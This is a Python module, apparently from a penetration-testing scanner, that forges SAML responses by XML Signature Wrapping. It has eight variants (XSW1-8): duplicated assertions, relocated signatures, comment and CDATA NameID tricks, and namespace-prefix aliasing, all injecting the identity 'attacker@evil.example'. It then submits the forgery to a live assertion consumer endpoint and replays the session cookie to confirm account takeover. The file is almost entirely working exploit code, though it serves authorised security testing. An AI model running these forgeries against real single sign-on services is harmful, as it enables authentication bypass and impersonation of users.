#!/usr/bin/env python3
"""saml_xsw_tester.py — SAML XML Signature Wrapping (XSW1-8) forgery.

Extends scanner.sh Check 7 (already does SAML endpoint discovery + a synthetic
unsigned-assertion signature-stripping test — that existing CRITICAL-ATO path is
NOT touched by this module, it is a separate pre-existing item). The gap this
module closes is XSW forgery, which REQUIRES a real, validly-signed SAMLResponse
to wrap — forging against a synthetic/unsigned assertion proves nothing. v1
requires the operator to supply a captured SAMLResponse file path manually (e.g.
extracted from a HAR); automatic HAR extraction is a separate future item.

Confirmation requires fetching an actual protected/identity resource with the
resulting session — a Set-Cookie + non-login-redirect from the ACS endpoint
alone is treated as inconclusive, not a finding.
"""
from __future__ import annotations

import base64
import copy
from dataclasses import dataclass

from lxml import etree

_ATTACKER_NAMEID = "attacker@evil.example"
_NSMAP = {
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
}


def load_captured_assertion(path: str) -> str | None:
    """Read an operator-supplied captured SAMLResponse XML file. Returns None
    (not an exception) when unavailable — callers must skip XSW gracefully."""
    import os
    if not os.path.isfile(path):
        return None
    with open(path, "r", errors="ignore") as f:
        return f.read()


def _set_nameid(assertion_el, value: str) -> None:
    nameid = assertion_el.find(".//saml:Subject/saml:NameID", namespaces=_NSMAP)
    if nameid is not None:
        nameid.text = value


_DS_SIGNATURE = "{http://www.w3.org/2000/09/xmldsig#}Signature"


def _xsw1_duplicate_assertion_before(root, original_assertion) -> etree._Element:
    """XSW1: clone the assertion with attacker NameID, insert BEFORE the
    original signed one — some parsers validate the first Assertion's signature
    but process the LAST Assertion element's claims. Position alone (before vs.
    XSW2's after) makes this structurally distinct; no marker attribute needed."""
    forged = copy.deepcopy(original_assertion)
    _set_nameid(forged, _ATTACKER_NAMEID)
    original_assertion.addprevious(forged)
    return root


def _xsw2_duplicate_assertion_after(root, original_assertion) -> etree._Element:
    """XSW2: same idea, inserted AFTER — some parsers process the FIRST element."""
    forged = copy.deepcopy(original_assertion)
    _set_nameid(forged, _ATTACKER_NAMEID)
    original_assertion.addnext(forged)
    return root


def _xsw3_relocate_original_signature(root, original_assertion) -> etree._Element:
    """XSW3: physically relocate the ORIGINAL assertion's real, signed
    ds:Signature element so it becomes a direct child of the samlp:Response
    element — a SIBLING of both assertions — instead of a descendant of the
    assertion it was actually issued for. An unsigned forged assertion
    (attacker NameID) is inserted before the now-designatured original.

    This targets SP verification code that locates *a* ds:Signature anywhere
    in the response document (e.g. a document-wide `//ds:Signature` XPath)
    and, on finding one, treats the whole response as "signed" without
    confirming the signature is a direct child of the specific assertion
    whose claims are then extracted. Distinct from XSW1/XSW2 (which never
    touch the signature's position at all) and from XSW4 (which relocates
    the FORGED copy's own signature, not the original's — see below).
    """
    forged = copy.deepcopy(original_assertion)
    _set_nameid(forged, _ATTACKER_NAMEID)
    forged_sig = forged.find(f".//{_DS_SIGNATURE}")
    if forged_sig is not None:
        # The forged assertion is unsigned by construction — the one real
        # signature in the document is the relocated original, below.
        forged.remove(forged_sig)
    original_assertion.addprevious(forged)

    sig = original_assertion.find(f"./{_DS_SIGNATURE}")
    if sig is not None:
        original_assertion.remove(sig)
        root.append(sig)
    return root


def _xsw4_relocate_forged_signature(root, original_assertion) -> etree._Element:
    """XSW4: the FORGED assertion's own (copied) ds:Signature element is
    stripped out and relocated to become a direct child of the samlp:Response
    element — the forged assertion itself ends up with no ds:Signature
    descendant at all, while the ORIGINAL assertion keeps its real signature
    untouched in place.

    This targets SP logic that treats "the Response contains a Signature
    element somewhere" as sufficient proof of trust, then extracts claims
    from the (unsigned) forged assertion. Distinct from XSW3, which instead
    relocates the ORIGINAL assertion's real signature and leaves the
    original designatured.
    """
    forged = copy.deepcopy(original_assertion)
    _set_nameid(forged, _ATTACKER_NAMEID)
    sig = forged.find(f".//{_DS_SIGNATURE}")
    if sig is not None:
        forged.remove(sig)
        root.append(sig)
    original_assertion.addprevious(forged)
    return root


def _xsw5_comment_after_nameid(root, original_assertion) -> etree._Element:
    """XSW5: forged assertion's NameID keeps legitimate-looking text
    ("legit-user") and gets a genuine XML comment node (etree.Comment)
    appended as a CHILD of the NameID element, containing the attacker's
    identity. A naive extractor that reads only `.text` sees "legit-user";
    one that concatenates all descendant text (including comments, e.g. via
    a careless string-join over `.itertext()`) picks up the attacker value.
    """
    forged = copy.deepcopy(original_assertion)
    nameid = forged.find(".//saml:Subject/saml:NameID", namespaces=_NSMAP)
    if nameid is not None:
        nameid.text = "legit-user"
        comment = etree.Comment(f" override NameID to {_ATTACKER_NAMEID} ")
        nameid.append(comment)
    original_assertion.addprevious(forged)
    return root


def _xsw6_cdata_nameid(root, original_assertion) -> etree._Element:
    """XSW6: forged assertion's NameID text is set via a genuine CDATA
    section (etree.CDATA) carrying the attacker identity literally —
    a real, distinct DOM/serialization mechanism from XSW5's comment node
    (CDATA is a text-node variant, not a sibling/child node at all). CDATA
    vs. comment is a real parser-differential vector: some naive extractors
    strip XML comments before reading text but do NOT unwrap/strip CDATA
    markers (or vice versa), so the two variants probe different classes
    of text-node handling.
    """
    forged = copy.deepcopy(original_assertion)
    nameid = forged.find(".//saml:Subject/saml:NameID", namespaces=_NSMAP)
    if nameid is not None:
        nameid.text = etree.CDATA(_ATTACKER_NAMEID)
    original_assertion.addprevious(forged)
    return root


def _build_aliased_forged_xml(original_assertion, alias_prefix: str) -> bytes:
    """Serialize a deep copy of the assertion (attacker NameID already set)
    and rewrite every use of the `saml` prefix — both the `xmlns:saml=`
    declaration and every `<saml:...>`/`</saml:...>` tag — to `alias_prefix`.
    The result is a syntactically distinct forged Assertion element that
    still resolves to the SAME SAML assertion namespace URI
    (urn:oasis:names:tc:SAML:2.0:assertion), just under a different prefix.

    Note: lxml/libxml2 silently reconciles (collapses) a differently-prefixed
    namespace back to an already-in-scope prefix for the same URI whenever a
    node is *attached* to an existing tree (addprevious/addnext/append) —
    this is why the alias is spliced in at the raw-string level by the
    caller and the combined document is parsed exactly once, rather than
    built via tree-attach calls.
    """
    forged = copy.deepcopy(original_assertion)
    _set_nameid(forged, _ATTACKER_NAMEID)
    raw = etree.tostring(forged)
    alias = alias_prefix.encode()
    # Rewrite the assertion's ACTUAL serialized prefix, not a hardcoded `saml`.
    # A real captured assertion may bind the SAML assertion namespace to any
    # prefix (ADFS/Shibboleth commonly use `saml2:`); hardcoding `<saml:` made
    # the replaces silently no-op on those, leaving the forged assertion with
    # the SAME prefix as the original — i.e. no wrapping at all. The prefix is
    # the same one `_xsw_namespace_alias_splice` uses for its splice-boundary
    # tags (original_assertion.prefix), so alias and boundary stay consistent.
    src_prefix = original_assertion.prefix
    if src_prefix:
        src = src_prefix.encode()
        raw = raw.replace(b"xmlns:" + src + b"=", b"xmlns:" + alias + b"=")
        raw = raw.replace(b"<" + src + b":", b"<" + alias + b":")
        raw = raw.replace(b"</" + src + b":", b"</" + alias + b":")
    return raw


def _xsw_namespace_alias_splice(root, original_assertion, alias_prefix: str,
                                 insert_after: bool) -> etree._Element:
    """Shared XSW7/XSW8 mechanic: build a forged assertion whose elements use
    `alias_prefix` (bound to the real SAML assertion namespace URI) instead
    of `saml:`, then splice its serialized XML immediately before/after the
    original assertion's serialized XML and re-parse the combined document in
    a single pass (see `_build_aliased_forged_xml` for why this must be a
    string splice + single parse, not a tree-attach)."""
    aliased_xml = _build_aliased_forged_xml(original_assertion, alias_prefix)

    base = etree.tostring(root)
    prefix = original_assertion.prefix
    localname = etree.QName(original_assertion).localname
    open_tag = (f"<{prefix}:{localname}" if prefix else f"<{localname}").encode()
    close_tag = (f"</{prefix}:{localname}>" if prefix else f"</{localname}>").encode()

    start = base.find(open_tag)
    if start == -1:
        return root  # defensive: unexpected structure, leave untouched
    end = base.find(close_tag, start)
    if end == -1:
        return root
    end += len(close_tag)

    combined = (base[:end] + aliased_xml + base[end:] if insert_after
                else base[:start] + aliased_xml + base[start:])
    return etree.fromstring(combined)


def _xsw7_namespace_alias_before(root, original_assertion) -> etree._Element:
    """XSW7: forged assertion uses the SAML assertion namespace URI bound to
    an alternate prefix (`s2:` instead of `saml:`) and is inserted BEFORE the
    original, still-`saml:`-prefixed, signed assertion.

    This targets SP extraction logic that hardcodes a prefix-string lookup
    (e.g. an XPath literally written as `.//saml:Assertion`) instead of
    resolving by namespace URI: such code would only ever "see" the
    original assertion and miss this `s2:`-prefixed forged one, while
    namespace-URI-correct (or overly permissive local-name-only) extraction
    logic would find either.
    """
    return _xsw_namespace_alias_splice(root, original_assertion, "s2", insert_after=False)


def _xsw8_namespace_alias_after(root, original_assertion) -> etree._Element:
    """XSW8: same alternate-namespace-prefix technique as XSW7, using a
    different alias (`s3:`), but the forged assertion is inserted AFTER the
    original — mirroring the XSW1-vs-XSW2 before/after split. This probes
    whether SP logic that has already been fooled/bypassed by prefix
    filtering then falls back to "the last Assertion element wins" by
    document position.
    """
    return _xsw_namespace_alias_splice(root, original_assertion, "s3", insert_after=True)


_VARIANT_BUILDERS = {
    "XSW1": lambda root, a: _xsw1_duplicate_assertion_before(root, a),
    "XSW2": lambda root, a: _xsw2_duplicate_assertion_after(root, a),
    "XSW3": lambda root, a: _xsw3_relocate_original_signature(root, a),
    "XSW4": lambda root, a: _xsw4_relocate_forged_signature(root, a),
    "XSW5": lambda root, a: _xsw5_comment_after_nameid(root, a),
    "XSW6": lambda root, a: _xsw6_cdata_nameid(root, a),
    "XSW7": lambda root, a: _xsw7_namespace_alias_before(root, a),
    "XSW8": lambda root, a: _xsw8_namespace_alias_after(root, a),
}


def generate_xsw_variants(saml_response_xml: str) -> dict[str, str]:
    """Build all 8 XSW variants from a real captured SAMLResponse. Each variant
    is independent (built from a fresh parse) so mutating one never affects
    another."""
    variants: dict[str, str] = {}
    for name, builder in _VARIANT_BUILDERS.items():
        root = etree.fromstring(saml_response_xml.encode())
        assertion = root.find(".//saml:Assertion", namespaces=_NSMAP)
        root = builder(root, assertion)
        variants[name] = etree.tostring(root).decode()
    return variants


@dataclass
class XswResult:
    confirmed: bool
    detail: str = ""
    # The last raw HTTP response examined (the ACS response if no session
    # cookie was ever issued, otherwise the protected-resource follow-up).
    # Lets callers check for a bot-management/WAF block without a second
    # round-trip.
    response: object = None


def confirm_new_session(client, acs_url: str, forged_response_b64: str,
                         protected_resource_url: str) -> XswResult:
    """POST the forged (base64) SAMLResponse to the ACS endpoint, then fetch an
    ACTUAL protected/identity resource with any resulting cookie — a Set-Cookie
    plus non-login redirect from the ACS alone is NOT sufficient proof."""
    acs_response = client.post(acs_url, data={"SAMLResponse": forged_response_b64})
    set_cookie = dict(acs_response.headers).get("Set-Cookie")
    if not set_cookie:
        return XswResult(confirmed=False, detail="no session cookie issued", response=acs_response)

    if not protected_resource_url:
        # The ACS issued a session cookie, but without a protected-resource URL
        # there is nothing to replay it against — and calling client.get("")
        # would raise in the real HTTP client. A bare Set-Cookie is never proof
        # on its own (that is the whole point of this function), so report it as
        # unconfirmed with an actionable detail rather than crashing.
        return XswResult(
            confirmed=False,
            detail="ACS issued a session cookie but no protected-resource URL "
                   "(VAPT_SAML_PROTECTED_RESOURCE) was supplied to confirm the forged session against",
            response=acs_response,
        )

    session_cookie = set_cookie.split(";")[0]
    # cookies={} is keyed by cookie NAME -> value; passing the whole
    # "name=value" string under a literal "raw" key sends a cookie literally
    # named "raw" (Cookie: raw=JSESSIONID=abc123), not the real session
    # cookie -- httpx/requests/curl_cffi all build the Cookie header
    # verbatim from the dict keys, none of them parse "name=value" back out.
    cookie_name, _, cookie_value = session_cookie.partition("=")
    resource_response = client.get(protected_resource_url,
                                    cookies={cookie_name: cookie_value})
    if resource_response.status_code in (301, 302, 303, 307, 308):
        location = dict(resource_response.headers).get("Location", "")
        if "login" in location.lower():
            return XswResult(confirmed=False, detail="redirected back to login", response=resource_response)
        return XswResult(confirmed=False, detail=f"unexpected redirect to {location}", response=resource_response)
    if resource_response.status_code == 200 and _ATTACKER_NAMEID in (resource_response.text or ""):
        return XswResult(confirmed=True, detail="protected resource rendered forged identity", response=resource_response)
    return XswResult(confirmed=False, detail="protected resource did not reflect forged identity", response=resource_response)
